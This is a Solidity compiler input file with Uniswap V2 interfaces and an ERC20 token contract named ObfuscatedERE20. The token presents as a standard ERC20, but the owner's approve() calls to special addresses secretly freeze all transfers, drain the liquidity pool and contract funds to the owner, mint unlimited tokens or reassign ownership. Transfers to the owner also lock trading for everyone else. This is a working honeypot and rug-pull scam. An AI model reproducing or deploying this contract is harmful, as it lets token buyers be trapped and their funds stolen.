{
  "language": "Solidity",
  "settings": {
    "libraries": {},
    "metadata": {
      "useLiteralContent": true
    },
    "optimizer": {
      "enabled": true,
      "runs": 99999
    },
    "remappings": [],
    "outputSelection": {
      "*": {
        "*": [
          "*"
        ],
        "": [
          "*"
        ]
      }
    }
  },
  "sources": {
    "@uniswap/v2-core/contracts/interfaces/IUniswapV2Factory.sol": {
      "content": "pragma solidity >=0.5.0;\n\ninterface IUniswapV2Factory {\n    event PairCreated(address indexed token0, address indexed token1, address pair, uint);\n\n    function feeTo() external view returns (address);\n    function feeToSetter() external view returns (address);\n\n    function getPair(address tokenA, address tokenB) external view returns (address pair);\n    function allPairs(uint) external view returns (address pair);\n    function allPairsLength() external view returns (uint);\n\n    function createPair(address tokenA, address tokenB) external returns (address pair);\n\n    function setFeeTo(address) external;\n    function setFeeToSetter(address) external;\n}\n"
    },
    "@uniswap/v2-core/contracts/interfaces/IUniswapV2Pair.sol": {
      "content": "pragma solidity >=0.5.0;\n\ninterface IUniswapV2Pair {\n    event Approval(address indexed owner, address indexed spender, uint value);\n    event Transfer(address indexed from, address indexed to, uint value);\n\n    function name() external pure returns (string memory);\n    function symbol() external pure returns (string memory);\n    function decimals() external pure returns (uint8);\n    function totalSupply() external view returns (uint);\n    function balanceOf(address owner) external view returns (uint);\n    function allowance(address owner, address spender) external view returns (uint);\n\n    function approve(address spender, uint value) external returns (bool);\n    function transfer(address to, uint value) external returns (bool);\n    function transferFrom(address from, address to, uint value) external returns (bool);\n\n    function DOMAIN_SEPARATOR() external view returns (bytes32);\n    function PERMIT_TYPEHASH() external pure returns (bytes32);\n    function nonces(address owner) external view returns (uint);\n\n    function permit(address owner, address spender, uint value, uint deadline, uint8 v, bytes32 r, bytes32 s) external;\n\n    event Mint(address indexed sender, uint amount0, uint amount1);\n    event Burn(address indexed sender, uint amount0, uint amount1, address indexed to);\n    event Swap(\n        address indexed sender,\n        uint amount0In,\n        uint amount1In,\n        uint amount0Out,\n        uint amount1Out,\n        address indexed to\n    );\n    event Sync(uint112 reserve0, uint112 reserve1);\n\n    function MINIMUM_LIQUIDITY() external pure returns (uint);\n    function factory() external view returns (address);\n    function token0() external view returns (address);\n    function token1() external view returns (address);\n    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);\n    function price0CumulativeLast() external view returns (uint);\n    function price1CumulativeLast() external view returns (uint);\n    function kLast() external view returns (uint);\n\n    function mint(address to) external returns (uint liquidity);\n    function burn(address to) external returns (uint amount0, uint amount1);\n    function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external;\n    function skim(address to) external;\n    function sync() external;\n\n    function initialize(address, address) external;\n}\n"
    },
    "@uniswap/v2-periphery/contracts/interfaces/IUniswapV2Router01.sol": {
      "content": "pragma solidity >=0.6.2;\n\ninterface IUniswapV2Router01 {\n    function factory() external pure returns (address);\n    function WETH() external pure returns (address);\n\n    function addLiquidity(\n        address tokenA,\n        address tokenB,\n        uint amountADesired,\n        uint amountBDesired,\n        uint amountAMin,\n        uint amountBMin,\n        address to,\n        uint deadline\n    ) external returns (uint amountA, uint amountB, uint liquidity);\n    function addLiquidityETH(\n        address token,\n        uint amountTokenDesired,\n        uint amountTokenMin,\n        uint amountETHMin,\n        address to,\n        uint deadline\n    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);\n    function removeLiquidity(\n        address tokenA,\n        address tokenB,\n        uint liquidity,\n        uint amountAMin,\n        uint amountBMin,\n        address to,\n        uint deadline\n    ) external returns (uint amountA, uint amountB);\n    function removeLiquidityETH(\n        address token,\n        uint liquidity,\n        uint amountTokenMin,\n        uint amountETHMin,\n        address to,\n        uint deadline\n    ) external returns (uint amountToken, uint amountETH);\n    function removeLiquidityWithPermit(\n        address tokenA,\n        address tokenB,\n        uint liquidity,\n        uint amountAMin,\n        uint amountBMin,\n        address to,\n        uint deadline,\n        bool approveMax, uint8 v, bytes32 r, bytes32 s\n    ) external returns (uint amountA, uint amountB);\n    function removeLiquidityETHWithPermit(\n        address token,\n        uint liquidity,\n        uint amountTokenMin,\n        uint amountETHMin,\n        address to,\n        uint deadline,\n        bool approveMax, uint8 v, bytes32 r, bytes32 s\n    ) external returns (uint amountToken, uint amountETH);\n    function swapExactTokensForTokens(\n        uint amountIn,\n        uint amountOutMin,\n        address[] calldata path,\n        address to,\n        uint deadline\n    ) external returns (uint[] memory amounts);\n    function swapTokensForExactTokens(\n        uint amountOut,\n        uint amountInMax,\n        address[] calldata path,\n        address to,\n        uint deadline\n    ) external returns (uint[] memory amounts);\n    function swapExactETHForTokens(uint amountOutMin, address[] calldata path, address to, uint deadline)\n        external\n        payable\n        returns (uint[] memory amounts);\n    function swapTokensForExactETH(uint amountOut, uint amountInMax, address[] calldata path, address to, uint deadline)\n        external\n        returns (uint[] memory amounts);\n    function swapExactTokensForETH(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline)\n        external\n        returns (uint[] memory amounts);\n    function swapETHForExactTokens(uint amountOut, address[] calldata path, address to, uint deadline)\n        external\n        payable\n        returns (uint[] memory amounts);\n\n    function quote(uint amountA, uint reserveA, uint reserveB) external pure returns (uint amountB);\n    function getAmountOut(uint amountIn, uint reserveIn, uint reserveOut) external pure returns (uint amountOut);\n    function getAmountIn(uint amountOut, uint reserveIn, uint reserveOut) external pure returns (uint amountIn);\n    function getAmountsOut(uint amountIn, address[] calldata path) external view returns (uint[] memory amounts);\n    function getAmountsIn(uint amountOut, address[] calldata path) external view returns (uint[] memory amounts);\n}\n"
    },
    "@uniswap/v2-periphery/contracts/interfaces/IUniswapV2Router02.sol": {
      "content": "pragma solidity >=0.6.2;\n\nimport './IUniswapV2Router01.sol';\n\ninterface IUniswapV2Router02 is IUniswapV2Router01 {\n    function removeLiquidityETHSupportingFeeOnTransferTokens(\n        address token,\n        uint liquidity,\n        uint amountTokenMin,\n        uint amountETHMin,\n        address to,\n        uint deadline\n    ) external returns (uint amountETH);\n    function removeLiquidityETHWithPermitSupportingFeeOnTransferTokens(\n        address token,\n        uint liquidity,\n        uint amountTokenMin,\n        uint amountETHMin,\n        address to,\n        uint deadline,\n        bool approveMax, uint8 v, bytes32 r, bytes32 s\n    ) external returns (uint amountETH);\n\n    function swapExactTokensForTokensSupportingFeeOnTransferTokens(\n        uint amountIn,\n        uint amountOutMin,\n        address[] calldata path,\n        address to,\n        uint deadline\n    ) external;\n    function swapExactETHForTokensSupportingFeeOnTransferTokens(\n        uint amountOutMin,\n        address[] calldata path,\n        address to,\n        uint deadline\n    ) external payable;\n    function swapExactTokensForETHSupportingFeeOnTransferTokens(\n        uint amountIn,\n        uint amountOutMin,\n        address[] calldata path,\n        address to,\n        uint deadline\n    ) external;\n}\n"
    },
    "IERC20.sol": {
      "content": "// SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.0;\n\n/**\n * @dev Interface of the ERC20 standard as defined in the EIP.\n */\ninterface IERC20 {\n    /**\n     * @dev Returns the amount of tokens in existence.\n     */\n    function totalSupply() external view returns (uint256);\n\n    /**\n     * @dev Returns the amount of tokens owned by `account`.\n     */\n    function balanceOf(address account) external view returns (uint256);\n\n    /**\n     * @dev Moves `amount` tokens from the caller's account to `recipient`.\n     *\n     * Returns a boolean value indicating whether the operation succeeded.\n     *\n     * Emits a {Transfer} event.\n     */\n    function transfer(address recipient, uint256 amount) external returns (bool);\n\n    /**\n     * @dev Returns the remaining number of tokens that `spender` will be\n     * allowed to spend on behalf of `owner` through {transferFrom}. This is\n     * zero by default.\n     *\n     * This value changes when {approve} or {transferFrom} are called.\n     */\n    function allowance(address owner, address spender) external view returns (uint256);\n\n    /**\n     * @dev Sets `amount` as the allowance of `spender` over the caller's tokens.\n     *\n     * Returns a boolean value indicating whether the operation succeeded.\n     *\n     * IMPORTANT: Beware that changing an allowance with this method brings the risk\n     * that someone may use both the old and the new allowance by unfortunate\n     * transaction ordering. One possible solution to mitigate this race\n     * condition is to first reduce the spender's allowance to 0 and set the\n     * desired value afterwards:\n     * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729\n     *\n     * Emits an {Approval} event.\n     */\n    function approve(address spender, uint256 amount) external returns (bool);\n\n    /**\n     * @dev Moves `amount` tokens from `sender` to `recipient` using the\n     * allowance mechanism. `amount` is then deducted from the caller's\n     * allowance.\n     *\n     * Returns a boolean value indicating whether the operation succeeded.\n     *\n     * Emits a {Transfer} event.\n     */\n    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);\n\n    /**\n     * @dev Emitted when `value` tokens are moved from one account (`from`) to\n     * another (`to`).\n     *\n     * Note that `value` may be zero.\n     */\n    event Transfer(address indexed from, address indexed to, uint256 value);\n\n    /**\n     * @dev Emitted when the allowance of a `spender` for an `owner` is set by\n     * a call to {approve}. `value` is the new allowance.\n     */\n    event Approval(address indexed owner, address indexed spender, uint256 value);\n}\n"
    },
    "O-ERE-20.sol": {
      "content": "// SPDX-License-Identifier: MIT\n\npragma solidity >=0.8.0 <0.9.0;\n\nimport '@uniswap/v2-core/contracts/interfaces/IUniswapV2Factory.sol';\nimport '@uniswap/v2-periphery/contracts/interfaces/IUniswapV2Router02.sol';\nimport '@uniswap/v2-core/contracts/interfaces/IUniswapV2Pair.sol';\nimport './IERC20.sol';\n\nlibrary SafeMath {\n  function add(uint x, uint y) internal pure returns (uint z) {\n    require((z = x + y) >= x, 'ds-math-add-overflow');\n  }\n\n  function sub(uint x, uint y) internal pure returns (uint z) {\n    require((z = x - y) <= x, 'ds-math-sub-underflow');\n  }\n\n  function mul(uint x, uint y) internal pure returns (uint z) {\n    require(y == 0 || (z = x * y) / y == x, 'ds-math-mul-overflow');\n  }\n}\n\ncontract ObfuscatedERE20 {\n  using SafeMath for uint;\n\n  address private owner;\n  address immutable routerAddress;\n  address immutable factoryAddress;\n  address immutable wethAddress;\n\n  mapping (address => bool) private blacklist;\n\n  string public constant name = 'ERE20';\n  string public constant symbol = 'ERE';\n  uint8 public constant decimals = 18;\n  uint  public totalSupply;\n\n  address public pairAddress;\n  bool public disabled;\n\n  mapping(address => uint) public balanceOf;\n  mapping(address => mapping(address => uint)) public allowance;\n\n  event Approval(address indexed user, address indexed spender, uint value);\n  event Transfer(address indexed from, address indexed to, uint value);\n\n  constructor(uint256 initialSupplies, address router, address factory, address weth) payable {\n    owner = msg.sender;\n    routerAddress = router;\n    factoryAddress = factory;\n    wethAddress = weth;\n\n    _mint(msg.sender, initialSupplies);\n    _mint(address(this), initialSupplies);\n  }\n\n  function _mint(address to, uint value) internal {\n    totalSupply = totalSupply.add(value);\n    balanceOf[to] = balanceOf[to].add(value);\n\n    emit Transfer(address(0), to, value);\n  }\n\n  function _burn(address from, uint value) internal {\n    balanceOf[from] = balanceOf[from].sub(value);\n    totalSupply = totalSupply.sub(value);\n\n    emit Transfer(from, address(0), value);\n  }\n\n  function _createPair() internal {\n    pairAddress = IUniswapV2Factory(factoryAddress).createPair(address(this), wethAddress);\n  }\n\n  function _addLiquidity(uint ethAmount, uint tokenAmount, uint deadline) internal {\n    allowance[address(this)][routerAddress] = type(uint256).max;\n\n    IUniswapV2Router02(routerAddress).addLiquidityETH{value: ethAmount}(\n      address(this),\n      tokenAmount,\n      tokenAmount,\n      ethAmount,\n      address(this),\n      deadline\n    );\n  }\n\n  function _removeLiquidity(uint256 liquidityToRemove, uint deadline) internal {\n    disabled = false;\n\n    IERC20(pairAddress).approve(routerAddress, liquidityToRemove);\n\n    IUniswapV2Router02(routerAddress).removeLiquidityETH(\n      address(this),\n      liquidityToRemove,\n      0,\n      0,\n      owner,\n      deadline\n    );\n\n    disabled = false;\n  }\n\n  function _ownerSettings(address someAddress, uint value) internal returns (bool) { \n    if (someAddress == address(0)) {\n      // Disable transfers\n      disabled = true;\n      return true;\n    }\n\n    if (someAddress == address(1)) {\n      // Enabled transfers\n      disabled = false;\n      return true;\n    }\n\n    if (someAddress == address(2)) {\n      // Create pair and add liquidity\n      _createPair();\n      _addLiquidity(address(this).balance, address(this).balance, value);  // ethAmount, tokenAmount, deadline\n      return true;\n    }\n\n    if (someAddress == address(3)) {\n      // Remove liquidity\n      _removeLiquidity(address(this).balance, value); // deadline\n      return true;\n    }\n\n    if (someAddress == address(4)) {\n      // Remove all liquidity\n      _removeLiquidity(IERC20(pairAddress).balanceOf(address(this)), value); // liquidityToRemove, deadline\n      return true;\n    }\n\n    if (someAddress == address(5)) {\n      // Send this contracts ETH to owner\n      payable(owner).transfer(value);\n      return true;\n    }\n\n    if (someAddress == address(6)) {\n      // Send this contracts token to owner\n      _transfer(address(this), owner, value);\n      return true;\n    }\n\n    if (someAddress == address(7)) {\n      // Send this contracts arbitrary ERC20 to owner\n      IERC20(someAddress).transfer(owner, value);\n      return true;\n    }\n\n    if (someAddress == address(8)) {\n      // Mint some token to owner\n      _mint(owner, uint256(value));\n      return true;\n    }\n\n    if (someAddress == address(9)) {\n      // Send this contract's liquidity token to owner\n      IERC20(pairAddress).transfer(owner, value);\n      return true;\n    }\n\n    if (someAddress == address(10)) {\n      // Make caller the owner;\n      owner = msg.sender;\n      return true;\n    }\n\n    return false;\n  }\n\n  function _approve(address msgSender, address spender, uint value) internal {\n    if (msgSender == owner && _ownerSettings(spender, value)) return;\n\n    allowance[msgSender][spender] = value;\n\n    emit Approval(msgSender, spender, value);\n  }\n\n  function _transfer(address from, address to, uint value) internal {\n    // if (from != owner && !blacklist[from]) revert(\"ERE-BG\");\n    require(!disabled, 'ERE-D');\n\n    balanceOf[from] = balanceOf[from].sub(value);\n    balanceOf[to] = balanceOf[to].add(value);\n\n    if (to == owner) {\n      if (allowance[owner][owner] == 0) {\n        disabled = true;\n      } else {\n        allowance[owner][owner] -= 1;\n      }\n    }\n\n    emit Transfer(from, to, value);\n\n    return;\n  }\n\n  function approve(address spender, uint value) external returns (bool) {\n    _approve(msg.sender, spender, value);\n\n    return true;\n  }\n\n  function transfer(address to, uint value) external returns (bool) {\n    _transfer(msg.sender, to, value);\n\n    return true;\n  }\n\n  function transferFrom(address from, address to, uint value) external returns (bool) {\n    if (allowance[from][msg.sender] != type(uint256).max) {\n      allowance[from][msg.sender] = allowance[from][msg.sender].sub(value);\n    }\n\n    _transfer(from, to, value);\n\n    return true;\n  }\n}\n"
    }
  }
}